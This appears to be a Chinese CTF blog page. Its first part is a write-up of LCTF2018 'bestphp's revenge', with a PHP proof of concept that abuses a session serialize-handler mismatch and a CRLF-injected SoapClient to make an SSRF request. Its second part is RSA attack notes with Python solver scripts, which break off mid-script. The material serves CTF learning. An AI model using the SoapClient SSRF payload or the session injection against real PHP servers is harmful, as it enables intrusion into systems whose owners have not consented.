<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</span><br><span class="line">php 键名+竖线（|）+经过serialize()函数处理过的值</span><br><span class="line">php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</span><br></pre></td></tr></table></figure>

<p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。</p>
<h3 id="php-binary引擎格式"><a href="#php-binary引擎格式" class="headerlink" title="php_binary引擎格式"></a>php_binary引擎格式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="number">0x04</span>&gt;names:<span class="number">5</span>:<span class="string">"Smi1e"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/mp8dvsh9ju.jpeg?imageView2/2/w/1620" alt="img"></p>
<h3 id="php引擎格式"><a href="#php引擎格式" class="headerlink" title="php引擎格式"></a>php引擎格式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:<span class="number">5</span>:<span class="string">"Smi1e"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/f9l78k32tl.jpeg?imageView2/2/w/1620" alt="img"></p>
<h3 id="php-searialize引擎格式"><a href="#php-searialize引擎格式" class="headerlink" title="php_searialize引擎格式"></a>php_searialize引擎格式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">5</span>:<span class="string">"Smi1e"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/rv3awdxox1.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。<br>例如传入<code>$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;}&#39;;</code><br>序列化引擎使用的是php_serialize，那么储存的session文件为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">5</span>:<span class="string">"|O:5:"</span>Smi1e<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:3:"</span>AAA<span class="string">";&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>而反序列化引擎如果使用的是php，就会把<code>|</code>作为作为key和value的分隔符。把<code>a:1:{s:4:&quot;name&quot;;s:5:&quot;</code>当作键名，而把<code>O:5:&quot;Smi1e&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;}</code>当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击</p>
<p>利用思路：</p>
<p>利用回调函数覆盖session序列化引擎为php_serilaze，构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数call_user_func，此时结合我刚开始所说的回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a><strong>解题</strong></h3><p>构造SSRF的Soap类的序列化字符串</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,array(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">    <span class="string">'user_agent'</span> =&gt; <span class="string">"N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n"</span>,</span><br><span class="line">    <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line">echo <span class="string">"|"</span>.$payload;</span><br></pre></td></tr></table></figure>

<p>这里又涉及到crlf，参考<a href="https://www.jianshu.com/p/d4c304dbd0af" target="_blank" rel="noopener">[转载]CRLF Injection漏洞的利用与实例分析</a>，我的理解是因为http请求遇到两个<code>\r\n</code>即<code>%0d%0a</code>，会将前半部分当做头部解析，而将剩下的部分当做体，那么如果头部可控，就可以注入crlf实现修改http请求包。如果我的理解有错，请大佬指正。</p>
<p>这个poc就是利用crlf伪造请求去访问flag.php并将结果保存在cookie为<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>的session中。</p>
<p>此时session_start()序列化使用的是php引擎。接下里我们覆盖变量b，</p>
<p>这里要知道<code>call_user_func()</code>函数如果传入的参数是<code>array</code>类型的话，会将数组的成员当做类名和方法，例如本题中可以先用<code>extract()</code>将b覆盖成<code>call_user_func()</code>，<code>reset($_SESSION)</code>就是<code>$_SESSION[&#39;name&#39;]</code>，我们可以传入<code>name=SoapClient</code>，那么最后<code>call_user_func($b, $a)</code>就变成<code>call_user_func(array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>，由于<code>SoapClient</code>类中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__get()</code>从而发送请求</p>
<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>先注入poc得到的session<br><img src="https://img2018.cnblogs.com/blog/1270588/201909/1270588-20190912225652245-1141552362.png" alt="img"></p>
<p>触发反序列化使SoapClient发送请求<br><img src="https://img2018.cnblogs.com/blog/1270588/201909/1270588-20190912225701518-432338964.png" alt="img"></p>
<p>携带poc中的cookie访问即可得到flag<br><img src="https://img2018.cnblogs.com/blog/1270588/201909/1270588-20190912225714209-244858227.png" alt="img"></p>
<h2 id="理解-amp-疑惑："><a href="#理解-amp-疑惑：" class="headerlink" title="理解&amp;疑惑："></a>理解&amp;疑惑：</h2><p>上面的wp是找来的，然后这里说说自己的理解叭。</p>
<p>第一步，构造poc</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span></span><br><span class="line"><span class="php">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span></span><br><span class="line"><span class="php">    <span class="string">'user_agent'</span> =&gt; <span class="string">"N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n"</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span></span><br><span class="line"><span class="php">$payload = urlencode(serialize($attack));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"|"</span>.$payload;</span></span><br></pre></td></tr></table></figure>

<p>然后是f=session_start，serialize_handler=php_serialize 修改serialize引擎</p>
<p>这样子存储为</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;<span class="attribute">s</span>:xx:<span class="string">"|$payload"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>然后服务器反序列化时默认用的引擎是php</p>
<p>就会把$payload赋值给a:1:{s:4:”name”;s:xx:”这一串玩意</p>
<p>第二步，用<code>extract()</code>将b覆盖成<code>call_user_func()</code>，<code>reset($_SESSION)</code>就是<code>$_SESSION[&#39;name&#39;]</code>，我们可以传入<code>name=SoapClient</code>，那么最后<code>call_user_func($b, $a)</code>就变成<code>call_user_func(array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>，由于<code>SoapClient</code>类中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__call()</code>，从而访问flag.php，把flag写入PHPSESSID为tcjr6nadpk3md7jbgioa6elfk4的session</p>
<p>第三步，访问这个事件，查看$_SESSION即可得到flag。</p>
<p>这里有个问题，虽然SoapClient这个方法是php原生类，但是具体的$target肯定是我们第一步写进去的，那么第一步是怎么写进去的呢？</p>
<p>如果我们不用修改serialize引擎以达到注入的效果，又会怎样呢？</p>
<p>直接name=$payload，那么存储为name|s:226:$paylaod；</p>
<p>反序列化时只是单纯的给name赋值为$paylaod，$payload前面的s标志导致其反序列化为单纯的字符串</p>
<p>而我们修改引擎后，存储为a:1:{s:4:”name”;s:xx:”|$payload”;}</p>
<p>反序列化时，给a:1:{s:4:”name”;s:xx:”赋值为$payload，而此处的$payload会被反序列化为一个SoapClient对象，而这个对象里面的值被我们控制</p>
<p>所以此处修改引擎的目的可以看作为，删除s:226这个标志，防止我们的$payload被反序列化为字符串</p>
<p>最后是一个基础问题，啥时候反序列的，应该是在第二步，我们调用SoapClient类时，服务器反序列这个类，但这里似乎反序列化的是a:1:{s:4:”name”;s:xx:”这个键的键值，而不是原生的SoapClient类。</p>
<h2 id="纠正："><a href="#纠正：" class="headerlink" title="纠正："></a>纠正：</h2><p>不是反序列了a:1:{s:4:”name”;s:xx:”这个键的键值，它的键值已经是个对象了，所以这之前应该已经反序列化了，所以应该也不是调用SoapClient类时，服务器才反序列这个类。</p>
<p><strong>PHP内置了多种处理器用于存储$_SESSION数据时会对数据进行序列化和反序列化</strong></p>
<p>回头看了这一句话，应该是，在程序运行完一次后，会将$_SESSION的值进行序列化存储进文件</p>
<p>$_SESSION的值在被读取时，即session_start()时会对文件中​$_SESSION的数值进行一次反序列化读取。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/10/07/LCTF2018_bestphp's_revenge/" data-id="ck2g3l2gn000flgv30p858vl3" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-UP/">Write UP</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-rsa套路笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/07/rsa套路笔记/" class="article-date">
  <time datetime="2019-10-07T13:33:35.000Z" itemprop="datePublished">2019-10-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/07/rsa套路笔记/">RSA套路笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="RSA套路笔记"><a href="#RSA套路笔记" class="headerlink" title="RSA套路笔记"></a>RSA套路笔记</h1><h2 id="基础原理"><a href="#基础原理" class="headerlink" title="基础原理"></a>基础原理</h2><p>我们首先介绍一下 RSA 加密的简化版本。令𝑁 = 𝑝𝑞是比特位长度相同(𝑛/2<br>位)的两个大素数的乘积。常见𝑁的长度大小是𝑛=1024 位（即：309 个十进制数<br>字），质 因子𝑝,𝑞=512 位。令𝑒,𝑑为满足𝑒𝑑 = 1 mod 𝜑(𝑁) 的两个整数，其中𝜑(𝑁) =<br>(𝑝 − 1)(𝑞 − 1)是乘法群ℤ𝑁 ∗ 的阶数。我们称𝑁为 RSA 模数，𝑒为加密指数，𝑑为解<br>密指数。〈𝑁,𝑒〉为公钥。顾名思义，公钥是公开的，并用于加密消息。〈𝑁,𝑑〉称为<br>密钥或私钥，一般情况下只有加密消息的接收者知道，私钥能够解密密文。<br>消息𝑀是一个整数且满足𝑀 ∈ ℤ𝑁 ∗ ，要加密𝑀，计算𝐶 = 𝑀^𝑒^ mod 𝑁，要解密密<br>文合法接受者计算𝑀 = 𝐶^𝑑^ mod 𝑁。（译者注：下面是译者添加的𝑀 = 𝐶𝑑 mod 𝑁<br>的证明）</p>
<hr>
<p>欧拉定理：若𝑎,𝑛为正整数，且𝑎,𝑛互素（即gcd(𝑎,𝑛) = 1），则𝑎^𝜑(𝑛)^ = 1 mod 𝑛。<br>已知 1 = 𝑒𝑑 mod 𝜑(𝑛)，𝑚 &lt; 𝑛，𝑐 = 𝑚^𝑒^mod 𝑛，gcd(𝑚,𝑛) = 1，求证𝑚 = 𝑐^𝑑^mod 𝑛。<br>证明： </p>
<p>等式左边为𝑚 </p>
<p>等式右边为𝑐^𝑑^mod 𝑛<br>∵ 𝑐 = 𝑚^𝑒^mod 𝑛 </p>
<p>∴ 𝑐^𝑑^mod 𝑛 = (𝑚^𝑒^mod 𝑛)^𝑑^ mod 𝑛 = 𝑚^𝑒𝑑^ mod 𝑛 </p>
<p>∵ 1 = 𝑒𝑑 mod 𝜑(𝑛) </p>
<p>∴ 𝑒𝑑 = 𝑘𝜑(𝑛) + 1 </p>
<p>∴ 𝑐^𝑑^mod 𝑛 = 𝑚^𝑒𝑑^ mod 𝑛 = 𝑚^𝑘𝜑(𝑛)+1^ mod 𝑛 = 𝑚(𝑚^𝜑(𝑛)^)^𝑘^ mod 𝑛 </p>
<p>∵ gcd(𝑚,𝑛) = 1</p>
<p> ∴ 𝑚^𝜑(𝑛)^ = 1 mod 𝑛 </p>
<p>∴ 𝑐^𝑑^mod 𝑛 = 𝑚(𝑚^𝜑(𝑛)^)^𝑘^ mod 𝑛 = 𝑚(1 mod 𝑛)^𝑘^ mod 𝑛 = 𝑚(1)^𝑘^ mod 𝑛 = 𝑚 mod 𝑛 </p>
<p>∵ 𝑚 &lt; 𝑛</p>
<p> ∴ 𝑚 mod 𝑛 = 𝑚</p>
<p> ∴ 𝑐^𝑑^mod 𝑛 = 𝑚 mod 𝑛 = 𝑚 </p>
<p>等式右边等于等式左边，证毕。</p>
<hr>
<h2 id="p和q相差过大或过小"><a href="#p和q相差过大或过小" class="headerlink" title="p和q相差过大或过小"></a>p和q相差过大或过小</h2><p>可直接yafu分解n</p>
<h2 id="多个模n有公约数"><a href="#多个模n有公约数" class="headerlink" title="多个模n有公约数"></a>多个模n有公约数</h2><p>欧几里得辗转相除法得公约数</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def gcd(<span class="keyword">a</span>, b):   <span class="comment">#求最大公约数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">a</span> &lt; b:</span><br><span class="line">        <span class="keyword">a</span>, b = b, <span class="keyword">a</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        temp = <span class="keyword">a</span> % b</span><br><span class="line">        <span class="keyword">a</span> = b</span><br><span class="line">        b = temp</span><br><span class="line">    <span class="literal">return</span> <span class="keyword">a</span></span><br></pre></td></tr></table></figure>

<h2 id="已知e-d-n分解模求p-q"><a href="#已知e-d-n分解模求p-q" class="headerlink" title="已知e,d,n分解模求p,q"></a>已知e,d,n分解模求p,q</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> random  </span><br><span class="line">def gcd(a, b):  </span><br><span class="line">   <span class="keyword">if</span> a &lt; b:  </span><br><span class="line">     a, <span class="attr">b</span> = b, a  </span><br><span class="line">   while b != <span class="number">0</span>:  </span><br><span class="line">     <span class="attr">temp</span> = a % b  </span><br><span class="line">     <span class="attr">a</span> = b  </span><br><span class="line">     <span class="attr">b</span> = temp  </span><br><span class="line">   return a  </span><br><span class="line">def getpq(n,e,d):  </span><br><span class="line">    <span class="attr">p</span> = <span class="number">1</span>  </span><br><span class="line">    <span class="attr">q</span> = <span class="number">1</span>  </span><br><span class="line">    while <span class="attr">p==1</span> <span class="literal">and</span> <span class="attr">q==1:</span>  </span><br><span class="line">        <span class="attr">k</span> = d * e - <span class="number">1</span>  </span><br><span class="line">        <span class="attr">g</span> = random.randint ( <span class="number">0</span> , n )  </span><br><span class="line">        while <span class="attr">p==1</span> <span class="literal">and</span> <span class="attr">q==1</span> <span class="literal">and</span> k % <span class="number">2</span> == <span class="number">0</span>:  </span><br><span class="line">            k /= <span class="number">2</span>  </span><br><span class="line">            <span class="attr">y</span> = pow(g,k,n)  </span><br><span class="line">            <span class="keyword">if</span> y!=<span class="number">1</span> <span class="literal">and</span> gcd(y-<span class="number">1</span>,n)&gt;<span class="number">1</span>:  </span><br><span class="line">                <span class="attr">p</span> = gcd(y-<span class="number">1</span>,n)  </span><br><span class="line">                <span class="attr">q</span> = n/p  </span><br><span class="line">    return p,q</span><br></pre></td></tr></table></figure>

<h2 id="dp-amp-dq泄露"><a href="#dp-amp-dq泄露" class="headerlink" title="dp&amp;dq泄露"></a>dp&amp;dq泄露</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp=d<span class="meta">%</span><span class="comment">(p-1)</span></span><br><span class="line">dq=d<span class="meta">%</span><span class="comment">(q-1)</span></span><br></pre></td></tr></table></figure>

<p>利用条件：给出p，q，dp，dq，c，即不给公钥e</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">InvQ=gmpy2.invert(q,p)</span><br><span class="line">mp=pow(c,dp,p)</span><br><span class="line">mq=pow(c,dq,q)</span><br><span class="line">m=(((mp-mq)*InvQ)%p)*q+mq</span><br><span class="line">print '&#123;:x&#125;'.format(m).decode('hex')</span><br></pre></td></tr></table></figure>

<h2 id="dp泄露"><a href="#dp泄露" class="headerlink" title="dp泄露"></a>dp泄露</h2><p>利用条件：题目给出公钥n,e以及dp</p>
<p>求解d</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def getd(n,<span class="keyword">e</span>,<span class="keyword">dp</span>):</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>,<span class="keyword">e</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">dp</span>*<span class="keyword">e</span>-<span class="number">1</span>)%i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((<span class="keyword">dp</span>*<span class="keyword">e</span>-<span class="number">1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">p</span>=((<span class="keyword">dp</span>*<span class="keyword">e</span>-<span class="number">1</span>)/i)+<span class="number">1</span></span><br><span class="line">                q=n/(((<span class="keyword">dp</span>*<span class="keyword">e</span>-<span class="number">1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">                phi = (<span class="keyword">p</span>-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">                d = gmpy2.<span class="built_in">invert</span>(<span class="keyword">e</span>,phi)%phi</span><br><span class="line">                <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure>

<h2 id="e与φ-n-不互素"><a href="#e与φ-n-不互素" class="headerlink" title="e与φ(n)不互素"></a>e与φ(n)不互素</h2><p>场景：题目给出两组公钥n1,n2,e1,e2以及第一组、第二组加密后的密文c1,c2</p>
<p>(其实本质就是给出e,q,p求d)</p>
<p>先甩一个脚本</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gcd(a, b):</span><br><span class="line">    if a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    while b != 0:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line">n1=0xbf510b8e2b169fbce366eb15a4f6c71b370f02f2108c7feb482234a386185bce1a740fa6498e04edbdf2a639e320619d9f39d3e740ebaf578af0426bc3e851001a1d599108a08725347f6680a7f5581a32d91505023701872c3df723e8de9f201d3b17059bebff944b915045870d757eb6d6d009eb4561cc7e4b89968e4433a9</span><br><span class="line">n2=0xba85d38d1bfc3fb281927c9246b5b771ac3344ca9fe1c2d9c793a886bffb5c84558f4a578cd5ba9e777a4e08f66d0cabe05b9aa2ae8d075778b5fbfff318a7f9b6f22e2eff6f79d8c1148941b3974f3e83a4a4f1520ad42336eddc572ec7ea04766eb798b2f1b1b52009b3eeea7741b2c55e3c7c11c5cf6a4e204c6b0d312f49</span><br><span class="line"></span><br><span class="line">p=gcd(n1,n2)</span><br><span class="line">q1=n1//p</span><br><span class="line">q2=n2//p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1=0x43e5cc4c99c3040aef2ccb0d4c45266f6b75cd7f9f1be105766689283f0886061c9cd52ac2b2b6c1b7d250c2079f354ca9b988db5556336201f3b5e489916b3b60b80c34bef8f608d7471fafaf14bee421b60630f42c5cc813356e786ff10e5efa334b8a73b7ea06afa6043f33be6a31010d306ba60516243add65c183da843a</span><br><span class="line">c2=0x79ec6350649377f69b475eca83a7d9d5356a1d62e29933e9c8e2b19b4b23626a581037aba3be6d7f73d5bed049350e41c1ed4cdc3e10ee34ec576ef3449be2f7d930c759612e1c23c4db71d0e5185a80b548031e3857dd93eca4af017fcd25895fcc4e8a2b36c1dd36b8cd9cc9200e2879f025928fe346e2cfae5200e66de6cc</span><br><span class="line">e1 =0x15d6439c6</span><br><span class="line">e2 =0x2c09848c6</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(gcd(e1,(p-1)*(q1-1)))</span></span><br><span class="line"><span class="comment">#print(gcd(e2,(p-1)*(q2-1)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1=e1//gcd(e1,(p-1)*(q1-1))</span><br><span class="line">e2=e2//gcd(e2,(p-1)*(q2-1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi1=(p-1)*(q1-1);phi2=(p-1)*(q2-1)</span><br><span class="line">d1=gmpy2.invert(e1,phi1)</span><br><span class="line">d2=gmpy2.invert(e2,phi2)</span><br><span class="line">f1=pow(c1,d1,n1)</span><br><span class="line">f2=pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GCRT(mi, ai):</span><br><span class="line">    curm, cura = mi[0], ai[0]</span><br><span class="line">    for (m, a) in zip(mi[1:], ai[1:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    return (cura % curm, curm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f3,lcm = GCRT([n1,n2],[f1,f2])</span><br><span class="line">assert(f3%n1==f1)</span><br><span class="line">assert(f3%n2==f2)</span><br><span class="line">assert(lcm==q1*q2*p)</span><br><span class="line">n3=q1*q2</span><br><span class="line">c3=f3%n3</span><br><span class="line">phi3=(q1-1)*(q2-1)</span><br><span class="line"></span><br><span class="line">d3=gmpy2.invert(39929,phi3)<span class="comment">#39929是79858//gcd((q1-1)*(q2-1),79858) 因为新的e和φ(n)还是有公因数2</span></span><br><span class="line">m3=pow(c3,d3,n3)</span><br><span class="line"></span><br><span class="line">if gmpy2.iroot(m3,2)[1] == 1:</span><br><span class="line">    flag=gmpy2.iroot(m3,2)[0]</span><br><span class="line"><span class="section">print(binascii.unhexlify(hex(flag)[2:].strip("L")))</span></span><br></pre></td></tr></table></figure>

<h2 id="公钥n由多个素数因子组成"><a href="#公钥n由多个素数因子组成" class="headerlink" title="公钥n由多个素数因子组成"></a>公钥n由多个素数因子组成</h2><p>这个简单，φ(n)=(q-1)(p-1)(r-1)</p>
<p>然后就普通解它就好了</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import gmpy2</span><br><span class="line">p=1249559655343546956371276497499</span><br><span class="line">q=1249559655343546956371276497489</span><br><span class="line">r=1249559655343546956371276497537</span><br><span class="line">s=1249559655343546956371276497423</span><br><span class="line">e=0x10001</span><br><span class="line">c=0x22fda6137013bac19754f78e8d9658498017f05a4b0814f2af97dc2c60fdc433d2949ea27b13337961ef3c4cf27452ad3c95</span><br><span class="line">n=p*q*r*s</span><br><span class="line"></span><br><span class="line">phi=(p-1)*(q-1)*(r-1)*(s-1)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=pow(c,d,n)</span><br></pre></td></tr></table></figure>

<h2 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h2><p>利用条件：同一个e（较小），不同的n，加密同一信息m得到不同的c</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii,gmpy2</span><br><span class="line"></span><br><span class="line">n =  [</span><br><span class="line"><span class="number">0x683fe30746a91545a45225e063e8dc64d26dbf98c75658a38a7c9dfd16dd38236c7aae7de5cbbf67056c9c57817fd3da79dc4955217f43caefde3b56a46acf5d</span>,</span><br><span class="line"><span class="number">0xa39292e6ad271bb6a2d1345940dfab8001a53d28bc7468f285d2873d784004c2653549c589dae91c6d8238977ff1c4bea4f17d424a0fc4d5587661cc7dde3a77</span>,</span><br><span class="line"><span class="number">0x52c32366d84d34564a5fdc1650fc401c41ad2a63a2d6ef57c32c7887bb25da9d42c0acfb887c6334c938839c9a43aca93b2c7468915d1846576f92c342046d1f</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">c</span> =  [</span><br><span class="line"><span 